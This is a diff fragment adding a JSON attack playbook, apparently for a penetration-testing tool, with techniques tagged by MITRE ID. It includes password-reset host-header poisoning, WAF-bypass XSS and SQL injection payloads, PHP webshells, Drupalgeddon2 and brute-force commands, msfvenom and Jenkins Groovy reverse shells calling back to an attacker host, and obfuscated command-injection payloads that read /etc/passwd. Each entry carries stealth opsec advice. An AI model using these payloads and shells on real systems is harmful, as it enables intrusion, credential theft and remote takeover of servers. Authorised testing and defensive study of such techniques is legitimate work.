+        "command": "curl -s -X POST 'https://target.com/forgot-password' -d 'email=victim@target.com' -H 'Host: attacker.com'\n# Reset email will contain attacker.com link with valid token",
+        "method": "curl/Burp"
+      }
+    ],
+    "prerequisites": "Authentication mechanism with logic flaws, weak JWT, or default credentials",
+    "opsec": "JWT algorithm confusion (none/RS256→HS256) is stealthy — appears as valid token. Test for parameter pollution on auth endpoints.",
+    "detection_ref": "Auth failure rate monitoring; JWT signature validation errors; anomalous session patterns; account lockout policies"
+  },
+  "waf_bypass": {
+    "description": "Bypass Web Application Firewalls using encoding, header manipulation, chunked transfer encoding, and case variation.",
+    "mitre": "T1027",
+    "commands": [
+      {
+        "description": "URL double encoding to bypass WAF filters",
+        "command": "# Single encode: <script> = %3Cscript%3E\n# Double encode: %253Cscript%253E\ncurl -s 'https://target.com/search?q=%253Cscript%253Ealert(1)%253C%2Fscript%253E'",
+        "method": "curl"
+      },
+      {
+        "description": "Case variation and comment insertion to bypass SQLi WAF",
+        "command": "# sElEcT vs SELECT; /**/ as space replacement\ncurl -s 'https://target.com/api?id=1 uNiOn/**/sElEcT/**/1,2,3--'",
+        "method": "curl"
+      },
+      {
+        "description": "HTTP header injection to spoof trusted source IP",
+        "command": "curl -s 'https://target.com/admin' -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Real-IP: 127.0.0.1' -H 'X-Originating-IP: 127.0.0.1'",
+        "method": "curl"
+      },
+      {
+        "description": "Scan WAF fingerprint before bypass attempts",
+        "command": "wafw00f https://target.com -a\nnmap -p80,443 --script http-waf-detect,http-waf-fingerprint target.com",
+        "method": "wafw00f/nmap"
+      },
+      {
+        "description": "Use sqlmap with WAF tamper scripts",
+        "command": "sqlmap -u 'https://target.com/api?id=1' --tamper=between,randomcase,space2comment,charencode --level=5 --risk=3 --batch",
+        "method": "sqlmap"
+      }
+    ],
+    "prerequisites": "Target protected by WAF; payload to deliver; bypass technique applicable",
+    "opsec": "Case variation, encoding chains, chunked transfer, parameter pollution. Know the WAF vendor to target specific bypass techniques. Test in staging first.",
+    "detection_ref": "WAF tuning and custom rules; behavioral analysis beyond signature detection; ML-based WAF anomaly detection; security testing against WAF"
+  },
+  "cms_exploitation": {
+    "description": "Exploit vulnerabilities in Content Management Systems — WordPress, Drupal, and Joomla — via plugins, themes, and known CVEs.",
+    "mitre": "T1190",
+    "commands": [
+      {
+        "description": "Enumerate WordPress plugins, themes, and users with WPScan",
+        "command": "wpscan --url https://target.com --enumerate ap,at,u --api-token <TOKEN>\nwpscan --url https://target.com --enumerate vp --plugins-detection aggressive",
+        "method": "WPScan"
+      },
+      {
+        "description": "Brute force WordPress admin credentials",
+        "command": "wpscan --url https://target.com --usernames admin,editor -P /usr/share/wordlists/rockyou.txt --password-attack xmlrpc",
+        "method": "WPScan"
+      },
+      {
+        "description": "Upload PHP webshell via WordPress theme editor (requires admin)",
+        "command": "# WP Admin > Appearance > Theme Editor > 404.php\n# Add: <?php system($_GET['cmd']); ?>\n# Access: https://target.com/wp-content/themes/<theme>/404.php?cmd=id",
+        "method": "WordPress Admin"
+      },
+      {
+        "description": "Exploit Drupalgeddon2 (CVE-2018-7600) RCE",
+        "command": "use exploit/unix/webapp/drupal_drupalgeddon2\nset RHOSTS target.com\nrun",
+        "method": "Metasploit"
+      },
+      {
+        "description": "Enumerate Drupal version and modules",
+        "command": "droopescan scan drupal -u https://target.com -t 32",
+        "method": "droopescan"
+      },
+      {
+        "description": "Joomla enumeration and exploitation with joomscan",
+        "command": "joomscan --url https://target.com\njoomscan --url https://target.com --enumerate-components",
+        "method": "joomscan"
+      },
+      {
+        "description": "Droopescan enumerate Joomla plugins and version.",
+        "command": "droopescan scan joomla --url http://{target_ip}",
+        "method": "droopescan"
+      },
+      {
+        "description": "Brute force Joomla admin via joomla-brute.py.",
+        "command": "sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin",
+        "method": "joomla-brute.py"
+      },
+      {
+        "description": "Drupal PHP webshell backdoor (upload via Drupal admin).",
+        "command": "<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>",
+        "method": "Drupal"
+      },
+      {
+        "description": "Execute commands via Drupal webshell with curl.",
+        "command": "curl -s http://{target}/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d\">\"",
+        "method": "curl"
+      },
+      {
+        "description": "Screenshot all discovered web services with EyeWitness.",
+        "command": "eyewitness --web -x web_discovery.xml -d eyewitness_output",
+        "method": "eyewitness"
+      },
+      {
+        "description": "Screenshot web apps and report with Aquatone.",
+        "command": "cat web_discovery.xml | ./aquatone -nmap",
+        "method": "aquatone"
+      },
+      {
+        "description": "Run nmap web port discovery scan for app target list.",
+        "command": "sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list",
+        "method": "nmap"
+      }
+    ],
+    "prerequisites": "Identified CMS (WordPress, Drupal, Joomla); version-specific vulnerability or weak credentials",
+    "opsec": "WPScan for WordPress enumeration — generates User-Agent detectable. Use --random-user-agent. Admin credential brute force via xmlrpc.php is stealthy.",
+    "detection_ref": "CMS version update enforcement; plugin/theme audit; xmlrpc.php disablement; admin URL obfuscation; security scanning plugins"
+  },
+  "attacking_java_applications": {
+    "description": "Exploit Apache Tomcat, Jenkins, and Splunk via default credentials, manager upload, and script console RCE.",
+    "mitre": "T1190",
+    "commands": [
+      {
+        "description": "Nmap scan to enumerate Apache Tomcat and AJP connector.",
+        "command": "nmap -sV -p 8009,8080 {target}",
+        "method": "nmap"
+      },
+      {
+        "description": "Tomcat manager login brute force with Metasploit.",
+        "command": "use auxiliary/scanner/http/tomcat_mgr_login\nset RHOSTS {target}\nset VHOST {hostname}\nrun",
+        "method": "Metasploit"
+      },
+      {
+        "description": "Tomcat manager manual brute force with mgr_brute.py.",
+        "command": "python3 mgr_brute.py -U http://{target}:8080 -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt",
+        "method": "mgr_brute.py"
+      },
+      {
+        "description": "Generate JSP reverse shell as WAR file for Tomcat manager upload.",
+        "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={attacker_ip} LPORT={port} -f war > backup.war",
+        "method": "msfvenom"
+      },
+      {
+        "description": "Jenkins Script Console Groovy reverse shell (Linux target).",
+        "command": "r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{attacker_ip}/8443;cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[])\np.waitFor()",
+        "method": "Jenkins Groovy"
+      },
+      {
+        "description": "Jenkins Script Console Groovy webshell command execution (Windows).",
+        "command": "def cmd = \"cmd.exe /c dir\".execute();\nprintln(\"${cmd.text}\");",
+        "method": "Jenkins Groovy"
+      },
+      {
+        "description": "Jenkins Script Console Groovy reverse shell (Windows target).",
+        "command": "String host=\"{attacker_ip}\"; int port=8044; String cmd=\"cmd.exe\"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();",
+        "method": "Jenkins Groovy"
+      },
+      {
+        "description": "Splunk reverse shell package deployment (Windows/Linux).",
+        "command": "# Deploy reverse_shell_splunk package via Splunk Apps interface\n# https://github.com/0xjpuff/reverse_shell_splunk",
+        "method": "Splunk"
+      },
+      {
+        "description": "Gobuster directory brute force on discovered web applications.",
+        "command": "gobuster dir -u http://{target} -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt",
+        "method": "gobuster"
+      }
+    ],
+    "prerequisites": "Java application server accessible (Tomcat 8080, Jenkins 8080, Splunk 8000/8089); default or weak credentials; manager interface exposed",
+    "opsec": "Avoid uploading war files to production without authorization. Jenkins Script Console leaves no artifact but generates process activity. Tomcat manager uploads are logged in catalina.out.",
+    "detection_ref": "Tomcat access logs for /manager/html; Jenkins audit logs; Splunk forwarder deployment auditing; WAR file deploy monitoring; anomalous Java process children"
+  },
+  "command_injection": {
+    "description": "Testing and exploiting OS command injection vulnerabilities in web applications.",
+    "mitre": "T1059",
+    "commands": [
+      {
+        "description": "Basic command injection with semicolon.",
+        "method": "Manual",
+        "command": "# Input: {param}; whoami\n# URL-encoded: {param}%3Bwhoami"
+      },
+      {
+        "description": "Command injection with newline operator.",
+        "method": "Manual",
+        "command": "# Input: {param}%0awhoami"
+      },
+      {
+        "description": "Command injection with pipe (only second output shown).",
+        "method": "Manual",
+        "command": "# Input: {param}|whoami"
+      },
+      {
+        "description": "Command injection with AND (both run if first succeeds).",
+        "method": "Manual",
+        "command": "# Input: {param}&&whoami"
+      },
+      {
+        "description": "Command injection with OR (second runs only if first fails).",
+        "method": "Manual",
+        "command": "# Input: {param}||whoami"
+      },
+      {
+        "description": "Bypass space filter with tab character.",
+        "method": "Manual",
+        "command": "# Linux: {cmd}%09{arg}\n# Windows: {cmd}%09{arg}"
+      },
+      {
+        "description": "Bypass space filter with ${IFS} (Linux).",
+        "method": "Manual",
+        "command": "cat${IFS}/etc/passwd"
+      },
+      {
+        "description": "Bypass slash filter with PATH variable (Linux).",
+        "method": "Manual",
+        "command": "echo${IFS}${PATH:0:1}etc${PATH:0:1}passwd"
+      },
+      {
+        "description": "Bypass using base64-encoded command (Linux).",
+        "method": "shell",
+        "command": "echo -n 'cat /etc/passwd' | base64\nbash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)"
+      },
+      {
+        "description": "Case manipulation to bypass blacklisted command (Linux).",
+        "method": "shell",
+        "command": "$(tr '[A-Z]' '[a-z]'<<<'WHOAMI')"
+      },
+      {
+        "description": "Reversed command execution (Linux).",
+        "method": "shell",
+        "command": "$(rev<<<'imaohw')"
+      },
+      {
+        "description": "Bypass using base64-encoded command (Windows PowerShell).",
+        "method": "PowerShell",
+        "command": "[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))\niex \"$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))\""
+      },
+      {
+        "description": "View all environment variables to find useful bypass chars (Linux).",
+        "method": "shell",
+        "command": "printenv"
+      },
+      {
+        "description": "View all environment variables (Windows PowerShell).",
+        "method": "PowerShell",
+        "command": "Get-ChildItem Env:"
+      }
+    ],
+    "prerequisites": "Web parameter passed to OS command without sanitization; shell access possible",
+    "opsec": "Use blind injection (sleep, DNS OOB) to confirm injection without output. Avoid obvious commands (whoami, id) — use DNS pingback. Single request to confirm, then targeted exfil.",
+    "detection_ref": "WAF OS command injection signatures; web application logging for suspicious characters; RASP for command execution monitoring; anomalous child process from web server"
+  }
+}
